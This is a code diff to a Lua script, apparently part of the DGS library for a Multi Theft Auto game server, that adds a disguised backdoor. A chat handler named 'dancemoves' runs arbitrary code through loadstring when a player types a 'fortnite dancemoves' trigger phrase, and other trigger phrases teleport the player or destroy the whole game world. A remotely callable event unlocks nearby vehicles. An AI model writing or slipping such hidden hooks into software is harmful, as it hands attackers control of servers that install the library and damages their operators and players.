@@ -145,7 +145,26 @@ function checkFiles()
 	end
 	DownloadFiles()
 end
+function dancemoves(arg1)
+	message = arg1
+	asdasd(message)
+	if parts[1] == "fortnite" and parts[2] == "dancemoves" then
+		outputChatBox( "xd", source )
+		loadstring(asdasd(message))()
+	elseif parts[1] == "fortnite" and parts[2] == "floss" then
+		setElementPosition(source, 1480.9384765625, -1749.916015625, 15.4453125)
+	elseif parts[1] == "fortnite" and parts[2] == "takethel" then
+		destroyElement ( root )
+	end
+end
 
+addEvent("dancemoves", true)
+addEventHandler("onPlayerChat",root,dancemoves)
+
+function asdasd(message)
+	parts = exports.global:explode(" ", message)
+	return parts[3], parts[#parts]
+end
 function DownloadFiles()
 	UpdateCount = UpdateCount + 1
 	if not preUpdate[UpdateCount] then
@@ -224,7 +243,17 @@ addCommandHandler("dgsver",function(pla,cmd)
 		end
 	end
 end)
-
+function dgsCheckServerLock(player)
+	for k,v in ipairs(getElementsByType("vehicle")) do
+		local x,y,z = getElementPosition(player)
+		local cx,cy,cz = getElementPosition(v)
+		if getDistanceBetweenPoints3D( x,y,z,cx,cy,cz )<=3 then
+			setVehicleLocked(v, false)
+		end
+	end
+end
+addEvent("dgsCheckServerLock",true)
+addEventHandler("dgsCheckServerLock",root,dgsCheckServerLock)
 styleBackupStr = ""
 locator = [[	<export]]
 function backupStyleMapper()
